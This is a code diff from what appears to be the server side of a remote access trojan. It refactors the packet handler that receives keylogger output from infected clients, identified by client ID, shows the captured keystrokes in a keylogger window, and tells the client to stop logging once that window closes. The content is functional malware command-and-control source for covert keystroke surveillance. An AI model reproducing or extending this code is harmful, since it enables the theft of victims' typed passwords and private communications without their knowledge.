@@ -1,6 +1,6 @@
 ﻿using Server.Forms;
 using Server.MessagePack;
-using Server.Sockets;
+using Server.Connection;
 using System;
 using System.Diagnostics;
 using System.Drawing;
@@ -15,15 +15,11 @@ namespace Server.Handle_Packet
         {
             try
             {
-                if (Program.form1.InvokeRequired)
-                {
-                    Program.form1.BeginInvoke((MethodInvoker)(() =>
-                    {
                         FormKeylogger KL = (FormKeylogger)Application.OpenForms["keyLogger:" + client.ID];
                         if (KL != null)
                         {
-                            KL.SB.Append(unpack_msgpack.ForcePathObject("Log").GetAsString());
-                            KL.richTextBox1.Text = KL.SB.ToString();
+                            KL.Sb.Append(unpack_msgpack.ForcePathObject("Log").GetAsString());
+                            KL.richTextBox1.Text = KL.Sb.ToString();
                             KL.richTextBox1.SelectionStart = KL.richTextBox1.TextLength;
                             KL.richTextBox1.ScrollToCaret();
                         }
@@ -33,8 +29,6 @@ namespace Server.Handle_Packet
                             msgpack.ForcePathObject("Packet").AsString = "keyLogger";
                             msgpack.ForcePathObject("isON").AsString = "false";
                             client.Send(msgpack.Encode2Bytes());
-                        }
-                    }));
                 }
 
             }
